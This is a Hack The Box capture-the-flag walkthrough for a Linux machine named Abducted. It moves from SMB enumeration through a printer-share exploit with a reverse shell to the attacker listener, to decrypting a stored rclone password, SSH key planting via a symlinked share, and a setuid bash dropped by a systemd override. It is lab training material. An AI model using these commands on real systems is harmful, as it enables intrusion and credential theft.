# Abducted HTB medium linux

## 1. NMAP

```powershell
┌──(kali㉿kali)-[~/Downloads]
└─$ nmap 10.129.17.137             
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-06 10:56 -0400
Nmap scan report for 10.129.17.137
Host is up (0.19s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 3.49 seconds
```

```powershell
┌──(kali㉿kali)-[~/Downloads]
└─$ nmap -sCV -p22,139,445 10.129.17.137
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-06 10:59 -0400
Nmap scan report for 10.129.17.137
Host is up (0.22s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2026-06-06T14:59:26
|_  start_date: N/A
|_nbstat: NetBIOS name: ABDUCTED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.10 seconds
```

- 22/tcp (SSH - Secure Shell)
- 139/tcp (NetBIOS)
- 445/tcp (SMB - Server Message Block)

## 2. SMB enum

```powershell
┌──(kali㉿kali)-[~/Downloads]
└─$ smbclient -U '' -N -L \\10.129.17.137        

        Sharename       Type      Comment
        ---------       ----      -------
        HP-Reception    Printer   Reception printer
        projects        Disk      Hartley Group Project Files
        transfer        Disk      Staff file transfer
        IPC$            IPC       IPC Service (Hartley Group Document Services)
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 10.129.17.137 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

- Successfully initiated a Null Session (anonymous login)

## 3. Rpcclient enum

```powershell
┌──(kali㉿kali)-[~/Downloads]
└─$ rpcclient -U "" -N 10.129.17.137
rpcclient $> querydispinfo
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: scott    Name: Scott Mercer      Desc: 
rpcclient $> enumdomusers
user:[scott] rid:[0x3e8]
rpcclient $> enumdomgroups
rpcclient $> enumdomains
name:[ABDUCTED] idx:[0x0]
name:[Builtin] idx:[0x1]
rpcclient $> netshareenumall
netname: HP-Reception
        remark: Reception printer
        path:   C:\var\spool\samba
        password:
netname: projects
        remark: Hartley Group Project Files
        path:   C:\srv\projects
        password:
netname: transfer
        remark: Staff file transfer
        path:   C:\srv\transfer
        password:
netname: IPC$
        remark: IPC Service (Hartley Group Document Services)
        path:   C:\tmp
        password:
rpcclient $> 

```

- found a valid system username: scott (Full Name: Scott Mercer), RID: 0x3e8
- Domain name - ABDUCTED

## 4. Tried accessing shares

```powershell
┌──(kali㉿kali)-[~/Downloads]
└─$ smbclient //10.129.17.137/projects -N
tree connect failed: NT_STATUS_ACCESS_DENIED
                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ smbclient //10.129.17.137/transfer -N
tree connect failed: NT_STATUS_ACCESS_DENIED
                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ smbclient //10.129.17.137/projects -U scott -N
session setup failed: NT_STATUS_LOGON_FAILURE
                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ smbclient //10.129.17.137/transfer -U scott -N
session setup failed: NT_STATUS_LOGON_FAILURE
```

## 5. Null auth allowed

```powershell
┌──(kali㉿kali)-[~/Downloads]
└─$ netexec smb 10.129.17.137 -u valid-username -p 'Password123!' --shares

SMB         10.129.17.137   445    ABDUCTED         [*] Unix - Samba (name:ABDUCTED) (domain:ABDUCTED) (signing:False) (SMBv1:None) (Null Auth:True)
SMB         10.129.17.137   445    ABDUCTED         [+] ABDUCTED\valid-username:Password123! (Guest)
SMB         10.129.17.137   445    ABDUCTED         [*] Enumerated shares
SMB         10.129.17.137   445    ABDUCTED         Share           Permissions     Remark
SMB         10.129.17.137   445    ABDUCTED         -----           -----------     ------
SMB         10.129.17.137   445    ABDUCTED         HP-Reception    WRITE           Reception printer
SMB         10.129.17.137   445    ABDUCTED         projects                        Hartley Group Project Files
SMB         10.129.17.137   445    ABDUCTED         transfer                        Staff file transfer
SMB         10.129.17.137   445    ABDUCTED         IPC$                            IPC Service (Hartley Group Document Services)

```

- Initially i just went for bruteforce
- We have Write permission on HP-reception
- Logged In as a "Guest” (ABDUCTED\valid-username:Password123! (Guest))

## 6. CVE-2026-4480

- After searching the keywords I have I landed onto this CVE.

![image.png](Abducted%20HTB%20medium%20linux/image.png)

After some searching up i found the exploit script for the CVE mentioned, and it being by the author confirmed i am on the right track 

![image.png](Abducted%20HTB%20medium%20linux/image%201.png)

## 7. Exploit

- Set-up listener

Using the exploit script 

```powershell
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 exploit.py 10.129.17.137 10.10.15.88 4444 -P HP-Reception

[*] target   : 10.129.17.137 (\\10.129.17.137\HP-Reception)
[*] callback : 10.10.15.88:4444  (start a listener first: nc -lvnp 4444)
[+] print job submitted -- check your listener / out-of-band channel
```

```powershell
┌──(kali㉿kali)-[~/Downloads]
└─$ nc -lvnp 4444

listening on [any] 4444 ...
connect to [10.10.15.88] from (UNKNOWN) [10.129.17.137] 55788
bash: cannot set terminal process group (4171): Inappropriate ioctl for device
bash: no job control in this shell
nobody@abducted:/var/spool/samba$ 
```

## 8. Recon as nobody

```powershell
nobody@abducted:/home$ ls -la 
ls -la 
total 16
drwxr-xr-x  4 root   root   4096 Jun  4 13:41 .
drwxr-xr-x 23 root   root   4096 Jun  4 13:41 ..
drwxr-x---  3 marcus marcus 4096 Jun  4 13:47 marcus
drwxr-x---  3 scott  scott  4096 Jun  4 13:47 scott
nobody@abducted:/home$ ls marcus 
ls marcus 
ls: cannot open directory 'marcus': Permission denied
nobody@abducted:/home$ ls scott
ls scott
ls: cannot open directory 'scott': Permission denied

```

```powershell
nobody@abducted:/home$ ss -tulnp 
ss -tulnp 
Netid State  Recv-Q Send-Q  Local Address:Port Peer Address:PortProcess
udp   UNCONN 0      0          127.0.0.54:53        0.0.0.0:*          
udp   UNCONN 0      0       127.0.0.53%lo:53        0.0.0.0:*          
udp   UNCONN 0      0             0.0.0.0:68        0.0.0.0:*          
udp   UNCONN 0      0      10.129.255.255:137       0.0.0.0:*          
udp   UNCONN 0      0       10.129.17.137:137       0.0.0.0:*          
udp   UNCONN 0      0             0.0.0.0:137       0.0.0.0:*          
udp   UNCONN 0      0      10.129.255.255:138       0.0.0.0:*          
udp   UNCONN 0      0       10.129.17.137:138       0.0.0.0:*          
udp   UNCONN 0      0             0.0.0.0:138       0.0.0.0:*          
tcp   LISTEN 0      4096    127.0.0.53%lo:53        0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.54:53        0.0.0.0:*          
tcp   LISTEN 0      50            0.0.0.0:445       0.0.0.0:*          
tcp   LISTEN 0      4096          0.0.0.0:22        0.0.0.0:*          
tcp   LISTEN 0      50            0.0.0.0:139       0.0.0.0:*          
tcp   LISTEN 0      50               [::]:445          [::]:*          
tcp   LISTEN 0      4096             [::]:22           [::]:*          
tcp   LISTEN 0      50               [::]:139          [::]:* 
```

#### /opt

```powershell
nobody@abducted:/$ ls /opt 
ls /opt 
offsite-backup
nobody@abducted:/$ ls /opt/offsite-backup
ls /opt/offsite-backup
rclone.conf
sync.sh
nobody@abducted:/$ cat /opt/offsite-backup
cat /opt/offsite-backup
cat: /opt/offsite-backup: Is a directory
nobody@abducted:/$ cat /opt/offsite-backup/sync.sh 
cat /opt/offsite-backup/sync.sh 
#!/bin/bash
/usr/bin/rclone --config /opt/offsite-backup/rclone.conf sync /srv/projects offsite:projects
```

```powershell
nobody@abducted:/$ cat /opt/offsite-backup/rclone.conf
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
shell_type = unix
```

- host = backup.hartley-group.internal
- user = svc-backup
- pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw

#### Cracking the pass

```powershell
nobody@abducted:/var/spool/samba$ 
<clone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
iXzvcib3SrpZ

```

- iXzvcib3SrpZ

## 8. Escalate to scott

```powershell
nobody@abducted:/var/spool/samba$ su marcus 
Password: 
su: Authentication failure
nobody@abducted:/var/spool/samba$ su scott
Password: 
scott@abducted:/$ cd /home/scott
scott@abducted:~$ ls
user.txt
scott@abducted:~$ cat user.txt
92e----------SNIP-----------6cb
```

## 9. Uploading linpeas

```powershell
nobody@abducted:/tmp$ wget http://10.10.15.88:8000/linpeas   
--2026-06-06 17:11:55--  http://10.10.15.88:8000/linpeas
Connecting to 10.10.15.88:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 82 [application/octet-stream]
Saving to: ‘linpeas’

linpeas             100%[===================>]      82  --.-KB/s    in 0s      

2026-06-06 17:11:55 (8.49 MB/s) - ‘linpeas’ saved [82/82]

nobody@abducted:/tmp$ ls 
linpeas
---SNIP---
vmware-root_808-2965972425
nobody@abducted:/tmp$ chmod +x linpeas   
```

Broke the shell :p.

## 10. Conf files

```powershell
nobody@abducted:/var/spool/samba$ ls -la /etc/samba/
total 24
drwxr-xr-x   3 root root 4096 Jun  4 13:41 .
drwxr-xr-x 108 root root 4096 Jun  4 14:08 ..
-rw-r--r--   1 root root    8 Apr 22  2025 gdbcommands
-rw-r--r--   1 root root  527 Apr 22  2025 shares.conf
-rw-r--r--   1 root root  361 Apr 22  2025 smb.conf
drwxr-xr-x   2 root root 4096 Jun  4 13:41 tls
nobody@abducted:/var/spool/samba$ 
nobody@abducted:/var/spool/samba$ ls -la /etc/samba/shares.conf 
-rw-r--r-- 1 root root 527 Apr 22  2025 /etc/samba/shares.conf
nobody@abducted:/var/spool/samba$ cat /etc/samba/shares.conf    
[HP-Reception]
   comment = Reception printer
   path = /var/spool/samba
   printable = yes
   guest ok = yes
   print command = /usr/local/bin/printaudit %J %s
   lpq command = /bin/true
   lprm command = /bin/true

[projects]
   comment = Hartley Group Project Files
   path = /srv/projects
   valid users = scott
   read only = no
   browseable = yes

[transfer]
   comment = Staff file transfer
   path = /srv/transfer
   valid users = scott
   force user = marcus
   read only = no
   wide links = yes
   browseable = yes
```

## 11. Priv esc

#### Step 1

```powershell
 ssh-keygen -q -t ed25519 -N '' -f /tmp/k
```

#### Step 2

```powershell
ln -s /home/marcus /srv/transfer/mh
```

#### Step 3

```powershell
smbclient //127.0.0.1/transfer -U 'scott%iXzvcib3SrpZ' -c 'mkdir mh/.ssh; put /tmp/k.pub mh/.ssh/authorized_keys'
```

#### Step 4

```powershell
ssh -i /tmp/k marcus@127.0.0.1
```

## 12. Root

#### Step 1: Create the Malicious Systemd Configuration Override

```powershell
cat > /etc/systemd/system/smbd.service.d/override.conf <<'EOF'
[Service]
ExecStartPre=/bin/cp /bin/bash /tmp/.rb
ExecStartPre=/bin/chmod 4755 /tmp/.rb
EOF
```

#### Step 2: Reload the Systemd Manager

```powershell
systemctl daemon-reload
```

#### Step 3: Restart the Samba Service

```powershell
systemctl restart smbd
```

#### Step 4: Execute Your Root Shell Binary

```powershell
ls -l /tmp/.rb
```

#### Step 5: Root

```powershell
/tmp/.rb -p
/root/root.txt
```
